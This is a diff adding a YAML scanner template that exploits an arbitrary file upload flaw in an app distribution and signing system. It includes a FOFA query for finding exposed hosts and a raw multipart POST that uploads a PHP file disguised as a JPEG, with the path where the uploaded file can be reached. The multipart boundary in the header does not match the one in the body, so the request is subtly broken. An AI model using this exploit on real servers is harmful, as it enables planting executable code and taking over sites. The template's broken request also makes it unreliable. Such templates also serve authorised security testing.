@@ -1,0 +1,51 @@
+id: poc-utdnyklr5ggsx8wt
+info:
+  name: APP分发签名系统index-uplog.php 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/utdnyklr5ggsx8wt'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: utdnyklr5ggsx8wt
+    fofa: body="/api/statistics/service-usage-amount"
+http:
+- raw:
+  - 'POST /source/pack/upload/2upload/index-uplog.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Content-Length: 290
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfF7NbGp0PAFq8Mkd
+
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+
+    Content-Disposition: form-data; name="time"
+
+
+    1-2
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+
+    Content-Disposition: form-data; name="app"; filename="1.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php phpinfo();?>
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--
+
+
+    文件访问地址/source/data/tmp/1-2.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
